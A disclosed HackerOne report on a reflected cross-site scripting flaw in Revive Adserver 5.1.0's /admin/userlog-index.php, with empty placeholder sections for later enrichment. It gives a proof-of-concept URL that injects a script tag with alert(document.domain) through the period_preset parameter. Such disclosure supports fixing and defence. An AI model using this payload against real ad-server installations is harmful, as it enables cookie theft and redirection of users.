---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1083231'
original_report_id: '1083231'
title: Reflected XSS on /admin/userlog-index.php
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: revive_adserver
created_at: '2021-01-21T16:36:57.155Z'
disclosed_at: '2021-01-26T14:26:57.069Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
asset_identifier: https://github.com/revive-adserver/revive-adserver
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on /admin/userlog-index.php

## Metadata

- HackerOne Report ID: 1083231
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: revive_adserver
- Disclosed At: 2021-01-26T14:26:57.069Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I found a reflected XSS attack on `/admin/userlog-index.php`. 

Revive-Adserver  version is `revive-adserver-5.1.0`.

- Go to `http://revive-adserver.loc/admin/userlog-index.php?advertiserId=0&publisherId=0&period_preset=all_events%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E&period_start=&period_end=&setPerPage=10`
- Malicious code executed

{F1166698}

Rendered response from server:

{F1166701}

## Impact

With this vulnerability, an attacker can for example steal users cookies or redirect users on malicious website.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
